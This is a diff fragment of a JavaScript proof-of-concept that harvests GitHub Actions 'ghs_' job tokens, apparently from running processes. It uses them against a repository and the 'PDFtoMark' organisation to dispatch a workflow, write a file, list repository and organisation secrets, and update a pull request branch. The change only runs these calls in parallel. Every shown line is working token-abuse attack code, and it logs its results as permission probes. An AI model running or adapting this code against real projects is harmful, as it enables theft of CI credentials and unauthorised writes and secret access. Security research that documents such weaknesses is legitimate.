@@ -34,11 +34,13 @@ function api(method, p, body, token) {
       if (!tok || !tok.startsWith('ghs_')) continue;
       const verify = await api('GET', '/repos/' + repo, null, tok);
       log('harvested ghs_ token pid=' + pid + ' len=' + tok.length + ' verify=' + verify.code);
-      const dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414870465/dispatches', { ref: 'main' }, tok);
-      const putContent = await api('PUT', '/repos/' + repo + '/contents/poc-write-probe.txt', { message: 'probe', content: 'aGk=' }, tok);
-      const listSecrets = await api('GET', '/repos/' + repo + '/actions/secrets', null, tok);
-      const orgSecrets = await api('GET', '/orgs/PDFtoMark/actions/secrets', null, tok);
-      const upd = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {}, tok);
+      const [dispatch, putContent, listSecrets, orgSecrets, upd] = await Promise.all([
+        api('POST', '/repos/' + repo + '/actions/workflows/414870465/dispatches', { ref: 'main' }, tok),
+        api('PUT', '/repos/' + repo + '/contents/poc-write-probe.txt', { message: 'probe', content: 'aGk=' }, tok),
+        api('GET', '/repos/' + repo + '/actions/secrets', null, tok),
+        api('GET', '/orgs/PDFtoMark/actions/secrets', null, tok),
+        api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {}, tok),
+      ]);
       log('dispatch ' + dispatch.code + ' contents ' + putContent.code + ' secrets ' + listSecrets.code + ' org ' + orgSecrets.code + ' update-branch ' + upd.code);
       const body = '[poc] permission probes with the workflow job token (pull-requests: write, actions: read)\n\n' +
         '```\n' +
